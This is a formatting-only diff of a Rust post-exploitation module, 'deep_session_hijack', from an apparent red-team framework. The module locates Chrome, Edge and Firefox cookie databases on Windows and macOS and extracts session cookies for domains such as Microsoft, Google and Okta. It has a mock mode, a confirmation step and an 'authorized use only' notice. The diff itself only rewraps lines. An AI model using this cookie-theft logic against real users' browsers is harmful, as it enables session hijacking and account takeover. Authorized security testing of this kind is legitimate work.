@@ -27,14 +27,16 @@
 //! - Safe for development and testing
 //! - No real browser access
 
-use anyhow::{anyhow, bail, Context, Result};
+use anyhow::{Context, Result, anyhow, bail};
 use async_trait::async_trait;
 use rusqlite::{Connection, OpenFlags};
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 use std::path::PathBuf;
 
-use crate::core::module::{CheckResult, Module, ModuleInfo, ModuleOption, ModuleResult, ModuleType};
+use crate::core::module::{
+    CheckResult, Module, ModuleInfo, ModuleOption, ModuleResult, ModuleType,
+};
 
 /// Supported browsers
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -64,8 +66,12 @@ impl Browser {
                 .unwrap_or_else(|_| home.join("AppData").join("Local"));
 
             match self {
-                Browser::Chrome => Ok(local_appdata.join("Google/Chrome/User Data/Default/Network/Cookies")),
-                Browser::Edge => Ok(local_appdata.join("Microsoft/Edge/User Data/Default/Network/Cookies")),
+                Browser::Chrome => {
+                    Ok(local_appdata.join("Google/Chrome/User Data/Default/Network/Cookies"))
+                }
+                Browser::Edge => {
+                    Ok(local_appdata.join("Microsoft/Edge/User Data/Default/Network/Cookies"))
+                }
                 Browser::Firefox => {
                     // Firefox uses profiles with random names, would need to enumerate
                     bail!("Firefox auto-detection not implemented on Windows")
@@ -76,8 +82,12 @@ impl Browser {
         #[cfg(target_os = "macos")]
         {
             match self {
-                Browser::Chrome => Ok(home.join("Library/Application Support/Google/Chrome/Default/Cookies")),
-                Browser::Edge => Ok(home.join("Library/Application Support/Microsoft Edge/Default/Cookies")),
+                Browser::Chrome => {
+                    Ok(home.join("Library/Application Support/Google/Chrome/Default/Cookies"))
+                }
+                Browser::Edge => {
+                    Ok(home.join("Library/Application Support/Microsoft Edge/Default/Cookies"))
+                }
                 Browser::Firefox => Ok(home.join("Library/Application Support/Firefox/Profiles")),
             }
         }
@@ -118,7 +128,10 @@ impl DeepSessionHijack {
     pub fn new() -> Self {
         let mut options = HashMap::new();
         options.insert("browser".to_string(), "chrome".to_string());
-        options.insert("target_domains".to_string(), "*.microsoft.com,*.google.com,*.okta.com".to_string());
+        options.insert(
+            "target_domains".to_string(),
+            "*.microsoft.com,*.google.com,*.okta.com".to_string(),
+        );
         options.insert("mock_mode".to_string(), "true".to_string());
         options.insert("cookie_db_path".to_string(), String::new());
         options.insert("output_format".to_string(), "json".to_string());
@@ -127,7 +140,11 @@ impl DeepSessionHijack {
     }
 
     /// Extract cookies from Chrome/Edge SQLite database
-    async fn extract_chromium_cookies(&self, db_path: &PathBuf, target_domains: &[String]) -> Result<Vec<CookieData>> {
+    async fn extract_chromium_cookies(
+        &self,
+        db_path: &PathBuf,
+        target_domains: &[String],
+    ) -> Result<Vec<CookieData>> {
         // Open database in read-only mode, in-memory if possible
         let conn = Connection::open_with_flags(
             db_path,
@@ -252,7 +269,11 @@ impl DeepSessionHijack {
 
     /// Convert cookies to JSON output
     fn format_output(&self, cookies: &[CookieData]) -> Result<String> {
-        let format = self.options.get("output_format").map(|s| s.as_str()).unwrap_or("json");
+        let format = self
+            .options
+            .get("output_format")
+            .map(|s| s.as_str())
+            .unwrap_or("json");
 
         match format {
             "json" => serde_json::to_string_pretty(cookies).context("Failed to serialize cookies"),
@@ -290,9 +311,10 @@ impl Module for DeepSessionHijack {
             name: "deep_session_hijack".to_string(),
             version: "1.0.0".to_string(),
             author: "Ferox Security Team".to_string(),
-            description: "Extract browser session data (cookies, tokens) from Chrome/Edge/Firefox. \
+            description:
+                "Extract browser session data (cookies, tokens) from Chrome/Edge/Firefox. \
                          AUTHORIZED USE ONLY - Requires explicit permission and user confirmation."
-                .to_string(),
+                    .to_string(),
             module_type: ModuleType::PostExploit,
             category: "post/browser".to_string(),
         }
@@ -323,7 +345,8 @@ impl Module for DeepSessionHijack {
             },
             ModuleOption {
                 name: "cookie_db_path".to_string(),
-                description: "Custom path to cookie database (overrides auto-detection)".to_string(),
+                description: "Custom path to cookie database (overrides auto-detection)"
+                    .to_string(),
                 required: false,
                 default_value: None,
                 current_value: self.options.get("cookie_db_path").cloned(),
@@ -349,13 +372,24 @@ impl Module for DeepSessionHijack {
 
     fn validate(&self) -> Result<()> {
         // Validate browser selection
-        let browser_str = self.options.get("browser").map(|s| s.as_str()).unwrap_or("chrome");
+        let browser_str = self
+            .options
+            .get("browser")
+            .map(|s| s.as_str())
+            .unwrap_or("chrome");
         if Browser::from_str(browser_str).is_none() {
-            bail!("Invalid browser: {}. Supported: chrome, edge, firefox", browser_str);
+            bail!(
+                "Invalid browser: {}. Supported: chrome, edge, firefox",
+                browser_str
+            );
         }
 
         // Validate output format
-        let format = self.options.get("output_format").map(|s| s.as_str()).unwrap_or("json");
+        let format = self
+            .options
+            .get("output_format")
+            .map(|s| s.as_str())
+            .unwrap_or("json");
         if !["json", "csv"].contains(&format) {
             bail!("Invalid output format: {}. Supported: json, csv", format);
         }
@@ -364,7 +398,11 @@ impl Module for DeepSessionHijack {
     }
 
     async fn check(&self) -> Result<CheckResult> {
-        let mock_mode = self.options.get("mock_mode").map(|s| s == "true").unwrap_or(true);
+        let mock_mode = self
+            .options
+            .get("mock_mode")
+            .map(|s| s == "true")
+            .unwrap_or(true);
 
         if mock_mode {
             let mut fingerprint = HashMap::new();
@@ -380,7 +418,11 @@ impl Module for DeepSessionHijack {
         }
 
         // Check if browser cookie database exists
-        let browser_str = self.options.get("browser").map(|s| s.as_str()).unwrap_or("chrome");
+        let browser_str = self
+            .options
+            .get("browser")
+            .map(|s| s.as_str())
+            .unwrap_or("chrome");
         let browser = Browser::from_str(browser_str).ok_or_else(|| anyhow!("Invalid browser"))?;
 
         let db_path = if let Some(custom_path) = self.options.get("cookie_db_path") {
@@ -412,7 +454,11 @@ impl Module for DeepSessionHijack {
     }
 
     async fn run(&mut self) -> Result<ModuleResult> {
-        let mock_mode = self.options.get("mock_mode").map(|s| s == "true").unwrap_or(true);
+        let mock_mode = self
+            .options
+            .get("mock_mode")
+            .map(|s| s == "true")
+            .unwrap_or(true);
         let target_domains = self.parse_target_domains();
 
         let cookies = if mock_mode {
@@ -420,8 +466,13 @@ impl Module for DeepSessionHijack {
             self.generate_mock_cookies(&target_domains)
         } else {
             // Real extraction - requires confirmation
-            let browser_str = self.options.get("browser").map(|s| s.as_str()).unwrap_or("chrome");
-            let browser = Browser::from_str(browser_str).ok_or_else(|| anyhow!("Invalid browser"))?;
+            let browser_str = self
+                .options
+                .get("browser")
+                .map(|s| s.as_str())
+                .unwrap_or("chrome");
+            let browser =
+                Browser::from_str(browser_str).ok_or_else(|| anyhow!("Invalid browser"))?;
 
             let db_path = if let Some(custom_path) = self.options.get("cookie_db_path") {
                 PathBuf::from(custom_path)
@@ -433,7 +484,8 @@ impl Module for DeepSessionHijack {
                 bail!("Cookie database not found at: {}", db_path.display());
             }
 
-            self.extract_chromium_cookies(&db_path, &target_domains).await?
+            self.extract_chromium_cookies(&db_path, &target_domains)
+                .await?
         };
 
         let output = self.format_output(&cookies)?;
@@ -446,9 +498,15 @@ impl Module for DeepSessionHijack {
 
         result = result
             .with_data("cookie_count", serde_json::json!(cookies.len()))
-            .with_data("target_domains", serde_json::json!(target_domains.join(", ")))
+            .with_data(
+                "target_domains",
+                serde_json::json!(target_domains.join(", ")),
+            )
             .with_data("cookies_json", serde_json::json!(output))
-            .with_data("browser", serde_json::json!(self.options.get("browser").cloned().unwrap_or_default()))
+            .with_data(
+                "browser",
+                serde_json::json!(self.options.get("browser").cloned().unwrap_or_default()),
+            )
             .with_data("mock_mode", serde_json::json!(mock_mode));
 
         Ok(result)
@@ -461,7 +519,11 @@ impl Module for DeepSessionHijack {
 
     fn requires_confirmation(&self) -> bool {
         // Only require confirmation if NOT in mock mode
-        let mock_mode = self.options.get("mock_mode").map(|s| s == "true").unwrap_or(true);
+        let mock_mode = self
+            .options
+            .get("mock_mode")
+            .map(|s| s == "true")
+            .unwrap_or(true);
         !mock_mode
     }
 }
@@ -474,7 +536,9 @@ mod tests {
     async fn test_mock_mode_extraction() {
         let mut module = DeepSessionHijack::new();
         module.set_option("mock_mode", "true").unwrap();
-        module.set_option("target_domains", "*.microsoft.com,*.google.com").unwrap();
+        module
+            .set_option("target_domains", "*.microsoft.com,*.google.com")
+            .unwrap();
 
         assert!(module.validate().is_ok());
 
@@ -526,7 +590,7 @@ mod tests {
     fn test_module_info() {
         let module = DeepSessionHijack::new();
         let info = module.info();
-    assert_eq!(info.name, "deep_session_hijack");
+        assert_eq!(info.name, "deep_session_hijack");
         assert!(info.description.contains("AUTHORIZED"));
     }
 }
